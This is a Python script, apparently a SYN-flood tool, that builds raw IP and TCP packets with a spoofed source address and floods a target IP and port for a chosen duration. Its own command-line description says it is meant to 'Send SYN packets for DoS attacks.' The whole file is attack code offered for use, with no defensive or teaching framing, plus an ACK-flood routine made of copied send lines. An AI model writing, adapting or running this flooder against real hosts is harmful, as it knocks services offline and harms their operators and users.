import socket
import random
import time
import struct
#import threading
import os
import sys
import concurrent.futures
import argparse

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = data[i] + (data[i + 1] << 8)
        s = s + w
    s = (s >> 16) + (s & 0xFFFF)
    s = ~s & 0xFFFF
    return s

def create_ip_packet(source_ip, dest_ip):
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            4 << 4 | 5,  # Version & IHL
                            0,            # Type of Service
                            40,           # Total Length (header + data)
                            random.randint(1, 65535),  # Identification
                            0,            # Flags & Fragment offset
                            255,          # TTL
                            socket.IPPROTO_TCP,  # Protocol
                            0,            # Checksum (will be filled by OS)
                            socket.inet_aton(source_ip),  # Source IP
                            socket.inet_aton(dest_ip))  # Destination IP

    checksum_value = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            4 << 4 | 5,  # Version & IHL
                            0,            # Type of Service
                            40,           # Total Length (header + data)
                            random.randint(1, 65535),  # Identification
                            0,            # Flags & Fragment offset
                            255,          # TTL
                            socket.IPPROTO_TCP,  # Protocol
                            checksum_value,  # Checksum yang benar
                            socket.inet_aton(source_ip),  # Source IP
                            socket.inet_aton(dest_ip))  # Destination IP

    return ip_header

def create_tcp_syn_packet(source_ip, source_port, dest_ip, dest_port):
    sequence = random.randint(0, 4294967295)
    ack = 0  
    data_offset = 5  

    pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(source_ip), socket.inet_aton(dest_ip), 0, socket.IPPROTO_TCP, 20)
    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, sequence, ack, (data_offset << 4) + 2, 0, 8192, 0, 0)

    checksum_value = checksum(pseudo_header + tcp_header)
    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, sequence, ack, (data_offset << 4) + 2, 0, 8192, checksum_value, 0)

    return tcp_header

def send_syn(ip, port, duration):
    source_ip = "192.168.1.100"  
    dest_ip = ip
    source_port = random.randint(1024, 65535)  

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("Error: You need admin/root privileges to run this script.")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

    ip_header = create_ip_packet(source_ip, dest_ip)
    tcp_syn = create_tcp_syn_packet(source_ip, source_port, dest_ip, port)

    end_time = time.time() + duration
    while time.time() < end_time:
        packet = ip_header + tcp_syn
        try:
            for _ in range(1000):
                sock.sendto(packet, (dest_ip, port))
        except Exception as e:
            print(f"Error while sending packet: {e}")
            break

    print(f"Sent SYN packets to {dest_ip}:{port} for {duration} seconds.")
    sock.close()

def send_ack(ip, port, sequence, ack, source_ip="192.168.1.100"):
    dest_ip = ip
    source_port = random.randint(1024, 65535)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("Error: You need admin/root privileges to run this script.")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

    ip_header = create_ip_packet(source_ip, dest_ip)
    tcp_ack = create_tcp_syn_packet(source_ip, source_port, dest_ip, port)
    tcp_ack = struct.pack('!HHLLBBHHH', source_port, port, sequence, ack + 1, (5 << 4) + 0, 16, 8192, 0, 0)  # ACK bit aktif

    packet = ip_header + tcp_ack
    try:
        for _ in range(50):
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
            sock.sendto(packet, (dest_ip, port))
    except Exception as e:
        print(f"Error while sending ACK packet: {e}")
    sock.close()

def IpSpoof(target_ip, target_port, duration):
    for _ in range(50):
        send_syn(target_ip, target_port, duration)
    

def is_windows():
    return os.name == 'nt'

def main(target_ip, target_port, duration):
    if is_windows():
        print("Error: Windows does not support sending raw TCP sockets.")
        sys.exit(1)

    with concurrent.futures.ThreadPoolExecutor() as executor:
        future = executor.submit(IpSpoof, target_ip, target_port, duration)
        try:
            future.result() 
        except KeyboardInterrupt:
            print("\nOperation aborted by user.")
            sys.exit(0)
        except Exception as e:
            print(f"Unexpected error: {e}")
            sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send SYN packets for DoS attacks.")
    parser.add_argument("ip", help="Target IP address", type=str)
    parser.add_argument("port", help="Target port number", type=int)
    parser.add_argument("duration", help="Duration in seconds to send packets", type=int)
    
    args = parser.parse_args()

    target_ip = args.ip
    target_port = args.port
    duration = args.duration

    main(target_ip, target_port, duration)
